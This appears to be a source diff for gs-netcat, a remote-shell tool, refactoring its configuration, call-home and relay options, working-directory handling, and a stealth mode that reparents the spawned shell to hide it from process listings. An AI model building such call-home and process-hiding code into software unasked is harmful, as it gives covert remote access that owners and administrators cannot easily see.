@@ -72,6 +72,9 @@ add_env_argv(int *argcptr, char **argvptr[])
 	// 	DEBUGF("argv[%d] = %s\n", i, newargv[i]);
 }
 
+#define PROC_SELF_EXE      "/proc/self/exe"
+#define PROC_SELF_EXE_FBSD "/proc/curproc/file"
+
 void
 init_defaults(int argc, int *argcptr, char **argvptr[])
 {
@@ -86,8 +89,21 @@ init_defaults(int argc, int *argcptr, char **argvptr[])
 	gopt.prg_name = NULL;
 	if (argvptr != NULL)
 	{
-		gopt.prg_name = *argvptr[0];
+        // Find my own binary.
+		// FIXME-2024: On non-unix this may fail if argv[0] was changed.
+		// Currently this does not matter because we only use it for GSNC_config
+		struct stat sb;
+		char *ptr = NULL;
+		if (stat(PROC_SELF_EXE, &sb) == 0)
+			ptr = PROC_SELF_EXE;
+		if ((ptr == NULL) && (stat(PROC_SELF_EXE_FBSD, &sb) == 0))
+			ptr = PROC_SELF_EXE_FBSD;
+		if ((ptr == NULL) && (stat(*argvptr[0], &sb) == 0))
+			ptr = *argvptr[0];
+		if (ptr != NULL)
+			gopt.prg_exename = strdup(ptr);
 
+		gopt.prg_name = *argvptr[0];
 		if ((gopt.prg_name != NULL) && (gopt.prg_name[0] == '/'))
 		{
 			char *ptr;
@@ -217,7 +233,7 @@ init_vars(void)
 	GS_LIST_init(&gopt.ids_peers, 0);
 	GS_CTX_init(&gopt.gs_ctx, &gopt.rfd, &gopt.wfd, &gopt.r, &gopt.w, &gopt.tv_now);
 
-	if (gopt.is_use_tor == 1)
+	if (gopt.flags & GSC_FL_OPT_TOR)
 		GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_USE_SOCKS, NULL, 0);
 	/* If Server is not available yet then wait for Server. */
 	if (gopt.is_sock_wait != 0)
@@ -244,8 +260,12 @@ init_vars(void)
 	if (gopt.gs_server_check_sec > 0)
 		GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_BUDDY_CHECK, NULL, 0);
 
-	if (gopt.homecall_sec > 0)
-		GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_CALLHOME_SEC, &gopt.homecall_sec, sizeof gopt.homecall_sec);
+	GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_CALLHOME_SEC, &gopt.callhome_sec, sizeof gopt.callhome_sec);
+	GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_GS_PORT, &gopt.gs_port, sizeof gopt.gs_port);
+	GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_GS_HOST, gopt.gs_host, 0);
+	GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_GS_SHELL, gopt.gs_shell, 0);
+	GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_GS_DOMAIN, gopt.gs_domain, 0);
+	GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_GS_WORKDIR, gopt.gs_workdir, 0);
 
 	// Prevent startup messages if gs-netcat is started as sub-system from
 	// gs-sftp or gs-mount
@@ -399,10 +419,9 @@ do_getopt(int argc, char *argv[])
 				break;
 			case 'T':
 				gopt.flags |= GSC_FL_OPT_TOR;
-				gopt.is_use_tor = 1;
 				break;
 			case 'q':
-				gopt.flagds |= GSC_FL_OPT_QUIET;
+				gopt.flags |= GSC_FL_OPT_QUIET;
 				break;
 			case 'r':
 				gopt.is_receive_only = 1;
@@ -985,7 +1004,7 @@ forkfd(int *fd)
 } while (0)
 
 static int
-pty_cmd(const char *cmd, pid_t *pidptr, int *err)
+pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 {
 	pid_t pid;
 	int fd = -1;
@@ -1015,21 +1034,21 @@ pty_cmd(const char *cmd, pid_t *pidptr, int *err)
 		return fd;
 	}
 
-	/* Make pid==1 the shell's parent to obfuscate `ps -eF f` view */
+	// Make pid==1 the shell's parent to obfuscate `ps -eF f` view
 	if (gopt.flags & GSC_FL_IS_STEALTH) {
+		// Race condition: parent's exit() may cause a SIGHUP before child
+		// had a change to call setsid(). Ignore SIGHUP until then:
+		signal(SIGHUP, SIG_IGN);
 		pid = fork();
-		XASSERT(pid >= 0, "fork(): %s\n", strerror(errno));
 
 		if (pid > 0) {
 			gopt.flags |= GSC_FL_IS_NO_ATEXIT;
-			// Oops. odd. if we exit to quickly then the child gets an I/O error
-			// on the connected socketpair().
-			sleep(1);
 			exit(0);	// Parent exits
 		}
 
 		/* HERE: Child. */
 		setsid();
+		signal(SIGHUP, SIG_DFL);
 	}
 
 	/* Our own forkpty() (solaris 10) returns the actual slave TTY.
@@ -1053,17 +1072,17 @@ pty_cmd(const char *cmd, pid_t *pidptr, int *err)
 	signal(SIGCHLD, SIG_DFL);
 	signal(SIGTERM, SIG_DFL);
 	/* Find out default ENV (just in case they do not exist in current
-		* env-variable such as when started during bootup.
-		* Note: Do not use shell from /etc/passwd as this might be /bin/nologin.
-		* Instead, use the same shell that was used when gs-netcat server got
-		* started.
-		*/
+	 * env-variable such as when started during bootup.
+	 * Note: Do not use shell from /etc/passwd as this might be /bin/nologin.
+	 * Instead, use the same shell that was used when gs-netcat server got
+	 * started.
+	 */
 	const char *shell = NULL; //"/bin/sh"; // default
 	char shell_name[64];	// e.g. -bash
 	const char *prg_name;
 	shell_name[0] = '\0';
 	if (cmd == NULL)
-		shell = GS_getenv("SHELL");
+		shell = ctx->gs_shell?:GS_getenv("SHELL");
 	shell = mk_shellname(shell, shell_name, sizeof shell_name, &prg_name);
 	if (shell == NULL)
 		SLOWEXIT("No shell found in /bin or /usr/bin or ./. Try setting SHELL=\n");
@@ -1074,8 +1093,7 @@ pty_cmd(const char *cmd, pid_t *pidptr, int *err)
 
 	char *user = "root";
 	char *home_env = "HOME=/root";
-	// char *name_env;
-	// char *logname_env;
+	char *home_workdir = ctx->gs_workdir?:GS_GETENV2("WORKDIR"); // GS_WORKDIR is set
 	struct passwd *pwd;
 	pwd = getpwuid(getuid());
 	if (pwd != NULL) {
@@ -1084,6 +1102,14 @@ pty_cmd(const char *cmd, pid_t *pidptr, int *err)
 		home_env = strdup(buf);
 	}
 	envp[envplen++] = home_env;
+	// if HOME= is not set then assume we were started from systemd
+	// and like to change WorkDir to user's ~/ (unelss GS_WORKDIR= is set)
+	if (home_workdir == NULL) {
+		if ((GS_getenv("HOME") == NULL) && (pwd != NULL))
+			home_workdir = pwd->pw_dir;
+	}
+	if (home_workdir != NULL)
+		chdir(home_workdir);
 
 	// Sometimes the user has no home directory or there is no .bashrc.
 	// Do the best we can to set a nice prompt and give a hint to the user.
@@ -1155,7 +1181,7 @@ pty_cmd(const char *cmd, pid_t *pidptr, int *err)
  * Spawn a cmd and return fd.
  */
 int
-fd_cmd(const char *cmd, pid_t *pidptr, int *err)
+fd_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 {
 	pid_t pid;
 	int fds[2];
@@ -1164,9 +1190,7 @@ fd_cmd(const char *cmd, pid_t *pidptr, int *err)
 	*err = 0;
 
 	if (gopt.is_interactive)
-	{
-		return pty_cmd(cmd, pidptr, err);
-	}
+		return pty_cmd(ctx, cmd, pidptr, err);
 
 	ret = socketpair(AF_UNIX, SOCK_STREAM, 0, fds);
 	if (ret != 0)
@@ -1361,10 +1385,10 @@ fd_kernel_flush(int fd)
 void
 cmd_ping(struct _peer *p)
 {
-	DEBUGF("Sending PING (waiting-for-reply==%d)\n", p->is_want_ping);
 	if (p->is_want_ping != 0)
 		return;
 
+	DEBUGF("Sending PING (waiting-for-reply==%d)\n", p->is_want_ping);
 	p->is_want_ping = 1;
 	GS_SELECT_FD_SET_W(p->gs);
 }
